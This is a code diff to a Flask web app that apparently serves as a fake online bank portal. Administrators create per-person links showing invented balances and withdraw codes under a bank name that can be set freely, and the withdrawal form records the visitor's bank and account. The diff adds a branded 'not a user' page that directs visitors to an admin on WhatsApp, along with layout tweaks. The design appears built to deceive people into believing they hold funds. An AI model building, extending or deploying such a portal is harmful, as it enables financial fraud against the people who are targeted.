@@ -1,9 +1,12 @@
-# app.py — Flask + Neon Postgres. no local disk, no telegram. redeploy-safe.
-import os, uuid, hashlib, secrets, psycopg2, psycopg2.extras
+# app.py — Flask + Neon Postgres. one file. no local disk, redeploy-safe.
+import os, uuid, hashlib, secrets, time, psycopg2, psycopg2.extras
+from urllib.parse import quote
 from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session, abort
 from functools import wraps
 
-DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()
+DATABASE_URL     = os.environ.get("DATABASE_URL", "").strip()
+WHATSAPP_NUMBER  = os.environ.get("WHATSAPP_NUMBER", "").strip()
+BANK_NAME        = os.environ.get("BANK_NAME", "Aurora Trust Bank")
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
@@ -104,15 +107,16 @@ def admin_required(f):
         return f(*a, **k)
     return w
 
-# ---------------- html (same as before) ----------------
+# ---------------- html ----------------
 
 ADMIN_HTML = """
 <!doctype html><html><head><meta charset="utf-8"><title>Admin</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{background:#0b0f1a;color:#e8eefc;font-family:system-ui;margin:0;padding:2rem}
+body{background:#0b0f1a;color:#e8eefc;font-family:system-ui,-apple-system,sans-serif;margin:0;padding:2rem}
 .container{max-width:1100px;margin:0 auto}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem}
-@media(max-width:900px){.grid{grid-template-columns:1fr}}
+@media(max-width:900px){.grid{grid-template-columns:1fr}body{padding:1rem}}
 .card{background:#111827;padding:1.5rem;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.5)}
 label{display:block;font-size:.85rem;color:#9aa7c7;margin-top:.8rem}
 input,select{width:100%;padding:.6rem;margin-top:.3rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box}
@@ -215,7 +219,60 @@ a{color:#60a5fa;word-break:break-all}
 def render_admin(authed=False, first_run=False, error=None):
     return render_template_string(ADMIN_HTML, authed=authed, first_run=first_run, error=error)
 
+# ---------------- landing (oops) ----------------
+
+NOT_A_USER_HTML = """
+<!doctype html><html><head><meta charset="utf-8"><title>{{ bank }} — Not a user</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+*{box-sizing:border-box}
+body{background:#0b0f1a;color:#e8eefc;font-family:system-ui,-apple-system,sans-serif;
+margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem}
+.card{max-width:440px;width:100%;text-align:center;
+background:linear-gradient(160deg,#111827,#0b0f1a);border:1px solid #1f2a44;
+border-radius:24px;padding:2.5rem 2rem;box-shadow:0 30px 80px rgba(0,0,0,.6)}
+.logo{font-weight:700;letter-spacing:.5px;color:#60a5fa;margin-bottom:1.5rem;font-size:.95rem}
+.oops{font-size:3.5rem;margin:0;line-height:1}
+h1{font-size:1.5rem;margin:1rem 0 .5rem;font-weight:600}
+p{color:#9aa7c7;line-height:1.55;margin:0 0 1.8rem;font-size:.95rem}
+.btn{display:inline-flex;align-items:center;gap:.6rem;justify-content:center;
+background:#25D366;color:#06210f;text-decoration:none;font-weight:700;
+padding:.9rem 1.5rem;border-radius:12px;width:100%;font-size:.95rem;
+transition:transform .15s ease,box-shadow .15s ease}
+.btn:hover{transform:translateY(-1px);box-shadow:0 10px 30px rgba(37,211,102,.25)}
+.btn svg{width:20px;height:20px;flex-shrink:0}
+.foot{margin-top:1.5rem;font-size:.75rem;color:#4b5876}
+</style></head><body>
+<div class="card">
+  <div class="logo">{{ bank }}</div>
+  <div class="oops">😕</div>
+  <h1>Oops — you're not a user yet</h1>
+  <p>Looks like you don't have an account with us. Message the admin on WhatsApp and they'll set you up.</p>
+  <a class="btn" href="https://wa.me/{{ phone }}?text={{ msg }}" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.5 14.4c-.3-.1-1.7-.8-1.9-.9-.3-.1-.5-.1-.7.1-.2.3-.7.9-.9 1.1-.2.2-.3.2-.6.1-.3-.1-1.2-.4-2.3-1.4-.8-.8-1.4-1.7-1.6-2-.2-.3 0-.5.1-.6.1-.1.3-.3.4-.5.1-.2.2-.3.3-.5.1-.2 0-.4 0-.5 0-.1-.7-1.6-.9-2.2-.2-.6-.5-.5-.7-.5h-.6c-.2 0-.5.1-.8.4-.3.3-1 1-1 2.4 0 1.4 1 2.8 1.2 3 .1.2 2 3.1 4.9 4.3.7.3 1.2.5 1.6.6.7.2 1.3.2 1.8.1.5-.1 1.7-.7 1.9-1.4.2-.7.2-1.2.2-1.4-.1-.1-.3-.2-.6-.3zM12 2C6.5 2 2 6.5 2 12c0 1.8.5 3.4 1.3 4.9L2 22l5.3-1.3c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10S17.5 2 12 2zm0 18.2c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3C4.1 14.9 3.6 13.5 3.6 12 3.6 7.4 7.4 3.6 12 3.6S20.4 7.4 20.4 12 16.6 20.2 12 20.2z"/></svg>
+    Message admin on WhatsApp
+  </a>
+  <div class="foot">{{ bank }} · secure portal</div>
+</div></body></html>
+"""
+
+def render_landing():
+    msg = quote("Hi, I'd like to be set up as a user of " + BANK_NAME + ".")
+    return render_template_string(NOT_A_USER_HTML, bank=BANK_NAME, phone=WHATSAPP_NUMBER, msg=msg)
+
 # ---------------- routes ----------------
+
+@app.route("/")
+def index():
+    return render_landing()
+
+@app.route("/favicon.ico")
+def favicon():
+    return "", 204
+
+@app.errorhandler(404)
+def not_found(e):
+    return render_landing(), 404
 
 @app.route("/admin")
 def admin_page():
@@ -268,7 +325,7 @@ def create_link():
     slug=uuid.uuid4().hex
     rec={"slug":slug,"name":name,"currency":cur,"balance":bal,"withdraw_code":code,
          "withdrawn":False,"bank":None,"account":None,"withdrawn_amount":None,
-         "created":int(__import__("time").time())}
+         "created":int(time.time())}
     db_put_link(rec)
     return jsonify({"slug":slug})
 
@@ -282,22 +339,25 @@ def delete_link(slug):
 
 USER_HTML = """
 <!doctype html><html><head><meta charset="utf-8"><title>{{ name }} — Account</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{background:#0b0f1a;color:#e8eefc;font-family:system-ui;margin:0}
+body{background:#0b0f1a;color:#e8eefc;font-family:system-ui,-apple-system,sans-serif;margin:0}
 .topbar{display:flex;justify-content:space-between;padding:1rem 2rem;border-bottom:1px solid #1f2a44}
 .logo{font-weight:700}
 .wrap{max-width:900px;margin:2rem auto;padding:0 1rem}
 .hero{background:linear-gradient(135deg,#1e3a8a,#1e293b);padding:2rem;border-radius:20px}
-.label{color:#9aa7c7;font-size:.85rem;text-transform:uppercase}
+.label{color:#9aa7c7;font-size:.85rem;text-transform:uppercase;letter-spacing:.5px}
 .balance{font-size:2.6rem;font-weight:700;margin:.4rem 0}
 .panel{background:#111827;padding:1.5rem;border-radius:16px;margin-top:1.5rem}
 input{width:100%;padding:.7rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box;margin-top:.4rem}
+label{display:block;font-size:.85rem;color:#9aa7c7;margin-top:.9rem}
 button{padding:.7rem 1.2rem;border:0;border-radius:10px;cursor:pointer;font-weight:600;margin-top:1rem}
 .primary{background:#22c55e;color:#06210f}
 .msg{margin-top:.8rem;font-size:.9rem}
 .err{color:#f87171}.ok{color:#4ade80}
+@media(max-width:600px){.topbar{padding:1rem}.wrap{margin:1rem auto}.hero{padding:1.5rem}.balance{font-size:2rem}}
 </style></head><body>
-<div class="topbar"><div class="logo">Aurora Trust Bank</div><div>{{ name }}</div></div>
+<div class="topbar"><div class="logo">{{ bank }}</div><div>{{ name }}</div></div>
 <div class="wrap">
   <div class="hero">
     <div class="label">Available balance</div>
@@ -342,7 +402,7 @@ async function go(){
 def view_account(slug):
     rec=db_get_link(slug)
     if not rec: abort(404)
-    return render_template_string(USER_HTML,name=rec["name"],currency=rec["currency"],
+    return render_template_string(USER_HTML, bank=BANK_NAME, name=rec["name"],currency=rec["currency"],
                                    balance=rec["balance"],withdrawn=rec.get("withdrawn",False))
 
 @app.route("/v/<slug>/withdraw", methods=["POST"])
